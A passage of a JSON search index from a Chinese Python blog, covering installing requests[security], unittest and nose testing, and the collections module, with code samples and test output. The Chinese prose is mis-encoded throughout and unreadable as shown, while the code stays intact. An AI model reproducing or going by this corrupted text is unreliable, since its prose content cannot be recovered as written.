éœ€è¦ç”¨åˆ°requestsæ–°ç‰ˆæœ¬ä¸­æä¾›çš„åŠŸèƒ½ï¼Œä½†æ˜¯requestså‡çº§åå‘é€HTTPSè¯·æ±‚æ—¶ä¼šæŠ¥å‡ºInsecurePlatformWarning, è¿™æ˜¯ä¸€ä¸ªç”±opensslæ¼æ´(Heartbleed)é€ æˆçš„è­¦å‘Šï¼Œæ‰€ä»¥éœ€è¦å‡çº§pyopensslç­‰æ¨¡å—ã€‚ 3. å‡çº§è¿‡ç¨‹pypiæä¾›äº†ä¸€ä¸ªå‡çº§åŒ…ï¼Œå«åšrequests[security], ç”¨pipè¿›è¡Œå‡çº§å³å¯ã€‚è¾“å…¥sudo pip install requests[security]å‘½ä»¤åï¼ŒpipæŠ¥é”™ï¼Œæ‰å‘ç°ä¸èƒ½æœ¬åœ°ç¼–è¯‘pythonåŒ…ï¼Œé‚å®‰è£…python-dev. ç„¶åå†æ¬¡å®‰è£…æ—¶å‘ç°ç¼ºå°‘openssl/aes.hå¤´æ–‡ä»¶ï¼Œåˆå»å®‰è£…opensslçš„å¼€å‘åŒ…libssl-dev, å†æ¬¡å®‰è£…ï¼Œå®‰è£…æˆåŠŸã€‚ 4. å‚è€ƒèµ„æ–™[åŸ]pipå®‰è£…æ¨¡å—è­¦å‘ŠInsecurePlatformWarningzsh - no matches found: requests[security]","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"openssl","slug":"openssl","permalink":"https://blog.stdioa.com/tags/openssl/"},{"name":"requests","slug":"requests","permalink":"https://blog.stdioa.com/tags/requests/"}]},{"title":"Pythonå­¦ä¹ ä¹‹unittest","slug":"learning-python-unittest","date":"2015-11-12T10:53:02.000Z","updated":"2017-06-29T04:38:40.399Z","comments":true,"path":"2015/11/learning-python-unittest/","link":"","permalink":"https://blog.stdioa.com/2015/11/learning-python-unittest/","excerpt":"å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚","text":"å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚ 1. ç®€ä»‹å•å…ƒæµ‹è¯•æ˜¯ç”¨æ¥å¯¹ä¸€ä¸ªæ¨¡å—ã€ä¸€ä¸ªå‡½æ•°æˆ–è€…ä¸€ä¸ªç±»æ¥è¿›è¡Œæ­£ç¡®æ€§æ£€éªŒçš„æµ‹è¯•å·¥ä½œã€‚ 2. ä½¿ç”¨unittestè¿›è¡Œæµ‹è¯•unittestæ˜¯Pythonè‡ªå¸¦çš„å•å…ƒæµ‹è¯•æ¨¡å—ï¼Œé€šè¿‡ç¼–å†™æµ‹è¯•ç±»ï¼Œåœ¨æµ‹è¯•ç±»ä¸­ç¼–å†™æµ‹è¯•å‡½æ•°çš„æ–¹å¼è¿›è¡Œæµ‹è¯•ã€‚ä¸çŸ¥é“è¯¥æµ‹è¯•ä»€ä¹ˆï¼Œå°±å¯¹pythonçš„listå¯¹è±¡æµ‹è¯•ä¸€ä¸‹å¥½äº†ã€‚ 2.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# coding: utf-8import unittest # ä½¿ç”¨unittestæ¨¡å—class TestStringMethods(unittest.TestCase): # æµ‹è¯•ç±»éœ€ç»§æ‰¿è‡ªunittest.TestCase def setUp(self): # åœ¨å‡½æ•°é‡Œè¿›è¡Œæµ‹è¯•ä¹‹å‰éœ€è¦è¿›è¡Œçš„ä¸€äº›å‡†å¤‡å·¥ä½œï¼ŒsetUpåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹å‰éƒ½ä¼šè¿è¡Œä¸€æ¬¡ self.d = [] def test_empty(self): \"\"\"\\ Empty testcase \"\"\" self.assertEqual([], []) # è‹¥aå’Œbç›¸ç­‰åˆ™é€šè¿‡ self.assertNotEqual([1], []) # è‹¥ä¸ç›¸ç­‰åˆ™é€šè¿‡ def test_bool(self): \"\"\"\\ Bool transform testcase \"\"\" self.assertTrue([1]) # è‹¥å†…éƒ¨çš„è¡¨è¾¾å¼æˆ–å¯¹è±¡ä¸ºçœŸåˆ™é€šè¿‡ self.assertFalse([]) # ä¸ºå‡åˆ™é€šè¿‡ self.assertTrue(bool([1])) self.assertFalse(bool([])) def test_append(self): \"\"\"\\ Append testcase \"\"\" list_ = [] list_.append(1) self.assertEqual(list_, [1]) self.assertNotEqual(list_, []) list_.append(2) self.assertIn(1, list_) # è‹¥a in båˆ™é€šè¿‡ self.assertNotIn(3, list_) # è‹¥a not in båˆ™é€šè¿‡ self.assertTrue(list_[0] == 1) self.assertEqual(list_[1], 2) def test_instance(self): list_ = [] self.assertIsInstance(list_, list) # è‹¥isinstance(a, b)ä¸ºçœŸåˆ™é€šè¿‡ self.assertNotIsInstance(list_, str) # è‹¥isinstance(a, b)ä¸ºå‡åˆ™é€šè¿‡ def test_index(self): \"\"\"\\ Index testcase \"\"\" list_ = [] with self.assertRaises(IndexError): # æ£€æµ‹æ˜¯å¦æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œæœ‰æŒ‡å®šå¼‚å¸¸æŠ›å‡ºåˆ™é€šè¿‡ a = list_[0] list_ = [1, 2, 3] self.assertEqual(list_[1], 2) self.assertEqual(list_[-2], 2) with self.assertRaises(IndexError): a = list_[4] def tearDown(self): # åœ¨æµ‹è¯•ä¹‹åéœ€è¦è¿›è¡Œçš„ä¸€äº›å¤„ç†äº‹é¡¹ï¼ŒtearDownåœ¨æ¯æ¬¡æµ‹è¯•ä¹‹åéƒ½ä¼šè¿è¡Œä¸€æ¬¡ del self.dif __name__ == '__main__': __import__(\"sys\").argv.append(\"-v\") # é‡‡ç”¨verboseæ–¹å¼ï¼Œè¾“å‡ºæµ‹è¯•ä¿¡æ¯ unittest.main() 2.2 è¿è¡Œæµ‹è¯•ç›´æ¥è¿è¡Œæµ‹è¯•ç¨‹åºï¼Œè¾“å‡º:1234567891011121314test_append (__main__.TestStringMethods)Append testcase ... oktest_bool (__main__.TestStringMethods)Bool transform testcase ... oktest_empty (__main__.TestStringMethods)Empty testcase ... oktest_index (__main__.TestStringMethods)Index testcase ... oktest_instance (__main__.TestStringMethods) ... ok----------------------------------------------------------------------Ran 5 tests in 0.001sOKè¿è¡Œpython -m unittest test.pyä¹Ÿå¯ä»¥è¿›è¡Œæµ‹è¯•ï¼›è¿è¡Œpython -m unittest, unittestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æµ‹è¯•ç±»è¿›è¡Œæµ‹è¯•ï¼ˆçœŸæ™ºèƒ½ï¼‰ï¼›è‹¥æœ‰æµ‹è¯•æœªé€šè¿‡ï¼Œunittestä¼šåœ¨æµ‹è¯•æ—¶æŠ¥å‘ŠFAIL, å¹¶åœ¨æµ‹è¯•ç»“æŸåå°†æ‰€æœ‰æœªé€šè¿‡æµ‹è¯•çš„é¡¹ç›®åˆ—å‡ºã€‚ 3. ä½¿ç”¨Noseè¿›è¡Œå•å…ƒæµ‹è¯•Noseæ˜¯ä¸€ä¸ªå¯¹unittestçš„æ‰©å±•æµ‹è¯•æ¡†æ¶ï¼Œèƒ½è‡ªåŠ¨å‘ç°å¹¶è¿è¡Œæµ‹è¯•ã€‚ä½¿ç”¨Noseï¼Œå¯ä»¥å°†å•å…ƒæµ‹è¯•ä»£ç çš„ç¼–å†™å˜å¾—æ›´ç®€å•ï¼Œä¸ç”¨å†æ„é€ æµ‹è¯•ç±»ï¼Œåªéœ€è¦åœ¨ä»¥testå¼€å¤´çš„æ–‡ä»¶ä¸­å»ºç«‹ä»¥testå¼€å¤´çš„å‡½æ•°å³å¯ã€‚ 3.1 ç¼–å†™æµ‹è¯•æ–‡ä»¶123456789101112131415# coding: utf-8import nosedef test_nose_installed_successfully(): import nose # è¿è¡Œæµ‹è¯•ä»£ç  assert True # assert Trueè¡¨ç¤ºæµ‹è¯•æˆåŠŸdef test_obviously_failed(): assert False # assert Falseè¡¨ç¤ºæµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥\"FAIL\"def test_returns_an_exception(): raise ValueError # è‹¥æŠ›å‡ºé™¤AssertionErrorçš„å¼‚å¸¸ï¼Œæµ‹è¯•æ—¶ä¼šæŠ¥\"ERROR\"nose.main() 3.2 è¿è¡Œæµ‹è¯•æ–‡ä»¶noseè‡ªå¸¦å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦è¾“å…¥nosetests [æµ‹è¯•æ–‡ä»¶å]å³å¯ï¼Œè‹¥æµ‹è¯•æ–‡ä»¶åä¸ºç©ºï¼Œåˆ™nosetestä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹å¯»æ‰¾æ‰€æœ‰æµ‹è¯•ã€‚ä»¥ä¸‹å‘½ä»¤æ ¼å¼å‡å¯æ¥å—ï¼š1234nosetests test.modulenosetests another.test:TestCase.test_methodnosetests a.test:TestCasenosetests /path/to/test/file.py:test_functionè¿è¡Œnosetests test_with_nose -vï¼Œè¾“å‡ºï¼š1234567891011121314151617181920212223242526272829$ nosetests test_with_nose -vtest_with_nose.test_nose_installed_successfully ... oktest_with_nose.test_obviously_failed ... FAILtest_with_nose.test_returns_an_exception ... ERROR======================================================================ERROR: test_with_nose.test_returns_an_exception----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 13, in test_returns_an_exception raise ValueErrorValueError======================================================================FAIL: test_with_nose.test_obviously_failed----------------------------------------------------------------------Traceback (most recent call last): File \"c:\\python35\\lib\\site-packages\\nose\\case.py\", line 198, in runTest self.test(*self.arg) File \"C:\\Users\\Stdio\\Desktop\\temp\\utest\\test_with_nose.py\", line 10, in test_obviously_failed assert FalseAssertionError----------------------------------------------------------------------Ran 3 tests in 0.003sFAILED (errors=1, failures=1) 4. å‚è€ƒæ–‡æ¡£unitest - Python Docå•å…ƒæµ‹è¯• - å»–é›ªå³°çš„pythonæ•™ç¨‹Nose documentationPythonçš„å­¦ä¹ ï¼ˆåå…«ï¼‰---- å•å…ƒæµ‹è¯•å·¥å…·nose 5. åè®°æ‹–äº†ä¸€ä¸ªæœˆï¼Œè¿™ä¸ªå‘å†ä¸å¡«æ—¥å­æ²¡æ³•è¿‡äº†(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»åˆ°ç°åœ¨æ²¡ç»™è‡ªå·±çš„ä»£ç å†™è¿‡æµ‹è¯•ï¼Œä¹Ÿæ˜¯é†‰â€¦ä¸€ç›´æƒ³è½¬Py3ä¸€ç›´æ²¡è½¬ï¼Œæ˜¨å¤©æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œå¼ºè¿«è‡ªå·±ç”¨ä¸€é˜µå­ï¼Œå¤šå»çœ‹çœ‹Py3çš„ç‰¹æ€§ï¼Œæœ‰æ—¶é—´æ•´ç†ä¸€ä¸‹ã€‚Gitçš„å‘è¿˜æ²¡å¡«å®Œä¸è¿‡è‡ªå·±çš„Pro Gitçœ‹çš„å·®ä¸å¤šäº†ï¼Œè²Œä¼¼ä¹Ÿæ»¡è¶³è‡ªå·±çš„éœ€æ±‚äº†ï¼Œå‡†å¤‡å¼ƒå‘ã€‚ä¸‹ä¸€ç¯‡æœ‰å¯èƒ½æ˜¯SQLAlchemy, MongoDB, Flaskâ€¦å“ï¼Œéšå®ƒå»å§ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"unittest","slug":"unittest","permalink":"https://blog.stdioa.com/tags/unittest/"}]},{"title":"Pythonå­¦ä¹ ä¹‹collections","slug":"learning-python-collections","date":"2015-10-29T12:55:00.000Z","updated":"2017-06-29T04:38:40.569Z","comments":true,"path":"2015/10/learning-python-collections/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-collections/","excerpt":"collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚","text":"collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚ 1. ç®€ä»‹ä¸Šé¢å°±æ˜¯ç®€ä»‹ï¼Œä¸ä¼šæ‰¯äº†ï¼Œè´´ä¸¤ä¸ªé“¾æ¥å¥½äº†ã€‚Collections - å»–é›ªå³°çš„Pythonæ•™ç¨‹Collections - High-performance container datatypes - Python Doc 2. namedtuple 2.1 åŠŸèƒ½ç®€ä»‹namedtupleä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºäº§ç”Ÿä¸€ä¸ªtupleç±»çš„å­ç±»ã€‚ç”±è¯¥ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å¯ä»¥åƒtupleä¸€æ ·pack/unpackï¼Œä¹Ÿå¯ä»¥é€šè¿‡é¢„å…ˆå®šä¹‰å¥½çš„æˆå‘˜åç§°è®¿é—®å¯¹è±¡å†…éƒ¨çš„æ•°æ®ã€‚ä¾‹ï¼š123456789101112131415161718&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; Point = namedtuple(\"Point\", ['x', 'y'])&gt;&gt;&gt; Point # namedtupleå‡½æ•°è¿”å›ä¸€ä¸ªç±»&lt;class '__main__.Point'&gt;&gt;&gt;&gt; Point.__base__&lt;type 'tuple'&gt;&gt;&gt;&gt; Point(x=1, y=2)Point(x=1, y=2)&gt;&gt;&gt; Point(1,2) # ä¸¤ç§å®šä¹‰æ–¹å¼å‡å¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼ŒPointçš„å‚æ•°é•¿åº¦æ˜¯ä¸å¯å˜çš„Point(x=1, y=2)&gt;&gt;&gt; p = Point(1, 2)&gt;&gt;&gt; p.x1&gt;&gt;&gt; x, y = p # å¯ä»¥åƒtupleä¸€æ ·è¿›è¡Œunpack&gt;&gt;&gt; x1&gt;&gt;&gt; Point._make((1,2)) # packçš„æ–¹å¼å’Œtupleä¸åŒPoint(x=1, y=2) 2.2 æˆå‘˜å‡½æ•°somenamedtuple._make(iterable), å°†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆlist, tupleç­‰ï¼‰è½¬åŒ–ä¸ºä¸€ä¸ªnamedtupleå¯¹è±¡ã€‚123&gt;&gt;&gt; t = [11, 22]&gt;&gt;&gt; Point._make(t)Point(x=11, y=22)somenamedtuple._asdict(), å°†å¯¹è±¡è½¬åŒ–ä¸€ä¸ªä¸ºé”®å€¼å’Œæ•°æ®å¯¹åº”çš„OrderedDict.12&gt;&gt;&gt; p._asdict()OrderedDict([('x', 11), ('y', 22)])somenamedtuple._replace(kwargs), è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­çš„å€¼æŒ‰ç…§_replaceå‡½æ•°ä¸­çš„å‚æ•°æ‰€æ”¹å˜ã€‚123&gt;&gt;&gt; p = Point(x=11, y=22)&gt;&gt;&gt; p._replace(x=33)Point(x=33, y=22)somenamedtuple._fields, è¿”å›ä¸€ä¸ªæ‰€æœ‰é”®å€¼æ„æˆçš„dict.1234567&gt;&gt;&gt; p._fields # æŸ¥çœ‹é”®å€¼åå­—('x', 'y')&gt;&gt;&gt; Color = namedtuple('Color', 'red green blue')&gt;&gt;&gt; Pixel = namedtuple('Pixel', Point._fields + Color._fields) # å°†Colorå’ŒPointâ€œåˆå¹¶â€&gt;&gt;&gt; Pixel(11, 22, 128, 255, 0)Pixel(x=11, y=22, red=128, green=255, blue=0) 2.3 åº”ç”¨åœºæ™¯åˆ—ä¸¾ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šåœ¨è¿›è¡ŒsqlæŸ¥è¯¢æ—¶ï¼Œcur.fetchone()ä¼šè¿”å›ä¸€ä¸ªtupleè€Œä¸æ˜¯dictï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªnamedtuple, ç„¶åå°†sqlçš„æŸ¥è¯¢æ•°æ®è½¬ä¸ºnamedtupleç±»ï¼Œç„¶åé€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ã€‚ä¸¾ä¸ªæ —å­ï¼ˆç§è´§ï¼‰ï¼š1234567891011121314Account = namedtuple(\"Account\", [\"username\", \"password\"]) # å®šä¹‰Accountç±»...cur = self.db.cursor()cur.execute(\"SELECT username, password FROM account\\ WHERE valid=1\\ ORDER BY RANDOM()\\ LIMIT 1\")account= Account._make(cur.fetchone()) # å°†æ•°æ®tupleè½¬ä¸ºAccountå¯¹è±¡self.postdata[\"username\"] = account.username # ç›´æ¥è®¿é—®æˆå‘˜æ•°æ®self.postdata[\"password\"] = account.password...# self.login(username, password)self.login(account) # å¯ä»¥å°†accountæ•´ä½“ä½œä¸ºå‚æ•°ï¼Œä½¿ç¨‹åºçœ‹èµ·æ¥æ›´ç®€æ´... 3. deque - åŒç«¯é˜Ÿåˆ— 3.1 ä»‹ç»dequeä¸ºDouble-Ended Queueçš„ç®€å†™ï¼Œç”¨äºæä¾›ä¸€ä¸ªå¯ä»¥å¿«é€Ÿè¿›è¡Œä¸¤ç«¯çš„æ’å…¥æˆ–åˆ é™¤æ“ä½œçš„é˜Ÿåˆ—ï¼ŒåŒæ—¶å¯ä»¥åƒlistä¸€æ ·é€šè¿‡ä¸‹æ ‡è®¿é—®æ•°æ®ã€‚ç”±äºlistæ˜¯å‚¨å­˜åœ¨çº¿æ€§ç©ºé—´çš„ï¼Œå…¶æ’å…¥/åˆ é™¤æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œæ‰€ä»¥å½“listæ¯”è¾ƒé•¿çš„æ—¶å€™ï¼Œåœ¨å…¶å¤´éƒ¨æ’å…¥/åˆ é™¤æ•°æ®çš„æ“ä½œéœ€è¦è€—è´¹å¤§é‡æ—¶é—´ã€‚æ‰€ä»¥å¦‚æœéœ€è¦å¯¹listå¯¹è±¡è¿›è¡Œå¤§é‡å¤´å’Œå°¾çš„æ’å…¥åˆ é™¤æ“ä½œæ—¶ï¼Œä½¿ç”¨dequeä¼šä½¿ç¨‹åºçš„è¿è¡Œæ•ˆç‡æ›´é«˜ï¼ˆå½“ç„¶ï¼Œä½¿ç”¨Queueæ¨¡å—çš„Queueå’ŒLifoQueueä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdequeå¯¹è±¡ä¸æ”¯æŒåœ¨ä¸­é—´ä½ç½®çš„æ’å…¥æ“ä½œã€‚dequeå¯¹è±¡ä¹Ÿè¢«åŒ…å«åœ¨Queueæ¨¡å—ä¸­ã€‚ 3.2 æˆå‘˜å‡½æ•°append(x), appendleft(x), åœ¨dequeçš„å°¾/å¤´æ’å…¥å¯¹è±¡x, ä¸listç±»ä¼¼ï¼›extend(iterable), extendleft(iterable), ä¸listçš„extendç±»ä¼¼ï¼›pop(x), popleft(x), ä¸listçš„popç±»ä¼¼ï¼›clear(), æ¸…ç©ºdequeçš„æ‰€æœ‰å…ƒç´ ï¼›count(x), ç»Ÿè®¡dequeä¸­xå…ƒç´ çš„ä¸ªæ•°ï¼›remove(x), åˆ é™¤dequeä¸­çš„xå…ƒç´ ï¼Œè‹¥xå…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™è§¦å‘ValueError;reverse(), å°†dequeåè½¬ï¼Œè¿”å›None, ä¸listçš„reverseç±»ä¼¼;rotate(i), å°†dequeæœ€æœ«å°¾iä¸ªå…ƒç´ å–å‡ºå¹¶æ’å…¥å¤´éƒ¨ï¼Œè‹¥i&lt;0, åˆ™å°†å¤´éƒ¨|i|ä¸ªå…ƒç´ å–å‡ºæ·»åŠ åˆ°å°¾éƒ¨ã€‚ 4. Counter - è®¡æ•°å™¨ 4.1 ä»‹ç»Counterç±»æ˜¯dictçš„å­ç±»ï¼Œæä¾›ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¯å¯¹hashableçš„å¯¹è±¡è¿›è¡Œè®¡æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹è±¡çš„è®¡æ•°å¯ä»¥å°äº0. 4.2 åŸºæœ¬æ“ä½œç›´æ¥ä¸Šä¾‹å­ï¼š12345678910&gt;&gt;&gt; c = Counter() # ç©ºè®¡æ•°å™¨&gt;&gt;&gt; c = Counter('gallahad') # å¯¹iterableå¯¹è±¡ä¸­çš„å…ƒç´ è¿›è¡Œè®¡æ•°&gt;&gt;&gt; c = Counter(&#123;'red': 4, 'blue': 2&#125;) # ä»mapä¸­è¯»å–å…ƒç´ å’Œå¯¹åº”è®¡æ•°&gt;&gt;&gt; c = Counter(cats=4, dogs=8) # ä»å…³é”®å­—å‚æ•°ä¸­è·å–&gt;&gt;&gt; cCounter(&#123;'dogs': 8, 'cats': 4&#125;)&gt;&gt;&gt; c[\"dogs\"] # è·å–è®¡æ•°8&gt;&gt;&gt; c[\"elephants\"] # å¯¹äºä¸å­˜åœ¨çš„å…ƒç´ ï¼Œä¼šè¿”å›0 0 4.3 æˆå‘˜å‡½æ•°elements(), è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼ŒåŒ…å«Counterä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œè‹¥å…ƒç´ xçš„è®¡æ•°ä¸ºnï¼Œåˆ™xåœ¨è¿­ä»£å™¨ä¸­ä¼šå‡ºç°næ¬¡ã€‚123c = Counter(a=4, b=2, c=0, d=-2)&gt;&gt;&gt; list(c.elements())['a', 'a', 'a', 'a', 'b', 'b']most_common([n]), è¿”å›è®¡æ•°æœ€å¤šçš„nä¸ªå…ƒç´ ã€‚12&gt;&gt;&gt; Counter('abracadabra').most_common(3)[('a', 5), ('r', 2), ('b', 2)]update([iterable-or-mapping]), åœ¨ç°æœ‰è®¡æ•°ä¸Šæ·»åŠ å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚123456&gt;&gt;&gt; c = Counter(\"1233\")&gt;&gt;&gt; cCounter(&#123;'3': 2, '1': 1, '2': 1&#125;)&gt;&gt;&gt; c.update(\"2345\")&gt;&gt;&gt; cCounter(&#123;'3': 3, '2': 2, '1': 1, '5': 1, '4': 1&#125;)substact([iterable-or-mapping]), åœ¨ç°æœ‰è®¡æ•°ä¸Šå‡å»å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚å¯ä»¥ç”¨åœ¨Counterå¯¹è±¡ä¸Šçš„é€šç”¨å‡½æ•°å’Œå¸¸è§ç”¨æ³•æœ‰ï¼šsum(c.values()), æ‰€æœ‰è®¡æ•°ä¹‹å’Œc.clear(), å°†è®¡æ•°é‡ç½®list(c), è¿”å›æ‰€æœ‰å…ƒç´ æ„æˆçš„åˆ—è¡¨, å…¶ä¸­å…ƒç´ ä¸ä¼šé‡å¤set(c), è½¬åŒ–ä¸ºsetdict(c), è½¬åŒ–ä¸ºdictc.items(), è½¬åŒ–ä¸ºç”±(å…ƒç´ , è®¡æ•°)æ„æˆçš„åˆ—è¡¨Counter(dict(list_of_pairs)), ä»ä¸Šè¿°åˆ—è¡¨è½¬åŒ–ä¸ºCounterå¯¹è±¡c.most_common()[:-n-1:-1], å‡ºç°æœ€å°‘çš„nä¸ªå…ƒç´ c += Counter(), ç§»é™¤æ‰€æœ‰å…ƒç´ è®¡æ•°ä¸º0çš„å…ƒç´ æ³¨æ„: å°†æŸå…ƒç´ çš„è®¡æ•°èµ‹å€¼ä¸º0, å¹¶ä¸èƒ½åœ¨è®¡æ•°å™¨çš„å…ƒç´ åˆ—è¡¨ä¸­åˆ é™¤è¯¥å…ƒç´ ã€‚è‹¥è¦åˆ é™¤è¯¥å…ƒç´ ï¼Œéœ€è¦ç”¨del.12345678910111213&gt;&gt;&gt; c = Counter(\"12\")&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"]0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;)&gt;&gt;&gt; c[\"0\"] = 0&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1, '0': 0&#125;)&gt;&gt;&gt; del c[\"0\"]&gt;&gt;&gt; cCounter(&#123;'1': 1, '2': 1&#125;) 5. defaultdict 5.1 ä»‹ç»defaultdictç±»æ˜¯dictç±»çš„å­ç±»ï¼ŒåŒ…å«dictç±»çš„æ‰€æœ‰åŠŸèƒ½ã€‚ä¸dictä¸åŒçš„æ˜¯ï¼Œåœ¨è°ƒç”¨ä¸å­˜åœ¨çš„é”®å€¼æ—¶ï¼Œdictä¼šæŠ›å‡ºKeyErrorå¼‚å¸¸ï¼Œè€Œdefaultdictä¼šæ‰§è¡Œ__missing__å‡½æ•°, é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°æ¥è¿›è¡Œæ“ä½œæˆ–è¿”å›å€¼ã€‚å®šä¹‰æ–¹å¼å¦‚ä¸‹:1234d = defaultdict() # è¿™ç§å®šä¹‰æ–¹å¼è¿”å›çš„å¯¹è±¡è·Ÿæ™®é€šdictæ— å¼‚a = defaultdict(lambda: \"N/A\") # å®šä¹‰__missing__å‡½æ•°print a[\"0\"] # è¿”å›\"N/A\", åŒæ—¶a[\"0\"]è¢«èµ‹å€¼ä¸º\"N/A\" 5.2 åº”ç”¨åœºæ™¯1234567&gt;&gt;&gt; s = [('yellow', 1), ('blue', 2), ('yellow', 3), ('blue', 4), ('red', 1)]&gt;&gt;&gt; d = defaultdict(list) # è‹¥é”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™èµ‹å€¼ä¸º[]&gt;&gt;&gt; for k, v in s:... d[k].append(v)...&gt;&gt;&gt; d.items()[('blue', [2, 4]), ('red', [1]), ('yellow', [1, 3])] 6. OrderdDict 6.1 ç®€ä»‹ä½¿ç”¨dictæ—¶ï¼ŒKeyæ˜¯æ— åºçš„ã€‚åœ¨å¯¹dictåšè¿­ä»£æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç¡®å®šKeyçš„é¡ºåºã€‚å¦‚æœè¦ä¿æŒKeyçš„é¡ºåºï¼Œå¯ä»¥ç”¨OrderedDict.OrderedDictçš„é”®å€¼é¡ºåºæŒ‰ç…§é”®å€¼è¢«æ’å…¥çš„é¡ºåºæ’åˆ—ï¼Œè€Œä¸æ˜¯Keyæœ¬èº«çš„é¡ºåºã€‚OrderdDictçš„é”®å€¼å¯ä»¥é€šè¿‡è°ƒç”¨popitemå‡½æ•°è¢«å¼¹å‡ºï¼Œå¼¹å‡ºæ—¶å¼¹å‡º(key, item)çš„é”®å€¼å¯¹ã€‚1234567891011&gt;&gt;&gt; a = OrderedDict(&#123;\"one\": 1&#125;) # å¯é€šè¿‡dictå®šä¹‰ï¼Œä¹Ÿå¯ä¼ å…¥å¯è¿­ä»£å¯¹è±¡&gt;&gt;&gt; a[\"zero\"] = 0&gt;&gt;&gt; a[\"two\"] = 2&gt;&gt;&gt; aOrderedDict([('one', 1), ('zero', 0), ('two', 2)])&gt;&gt;&gt; a.popitem() # å¼¹å‡ºæœ€åä¸€ä¸ªé”®å€¼å¯¹('two', 2)&gt;&gt;&gt; a.popitem(last=False) # å¼¹å‡ºç¬¬ä¸€ä¸ªé”®å€¼å¯¹('one', 1)&gt;&gt;&gt; aOrderedDict([('zero', 0)]) 7. å‚è€ƒæ–‡æ¡£8.3 collections â€” High-performance container datatypescollections - å»–é›ªå³°çš„å®˜æ–¹æ•™ç¨‹ 8. åè®°è¿™ç¯‡åšæ–‡å†™äº†ä¸¤å¤©ï¼Œæ„Ÿè§‰åœ¨ç¿»è¯‘æ–‡æ¡£ï¼Œæœ‰ç‚¹æ¯ç‡¥ã€‚ä¸€ç›´è§‰å¾—åº”è¯¥å¤šå»äº†è§£Pythonçš„å†…ç½®å¸¸ç”¨æ¨¡å—ï¼Œä¸è¦æ±‚å®Œå…¨ç†Ÿç»ƒï¼Œè‡³å°‘è¦æœ‰ä¸ªå°è±¡ï¼Œè¿™æ ·åœ¨å¼€å‘ä¸­éœ€è¦ä½¿ç”¨è¿™äº›æ¨¡å—çš„æ—¶å€™ï¼Œæ‰èƒ½å¤Ÿæƒ³èµ·æ¥ç”¨å®ƒã€‚æ‰€ä»¥ï¼Œåˆå¡«å®Œä¸€ä¸ªå‘ã€‚ä¸‹ä¸€ä¸ªåº”è¯¥æ˜¯unittestå§ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"collections","slug":"collections","permalink":"https://blog.stdioa.com/tags/collections/"}]},{"title":"Pythonå­¦ä¹ 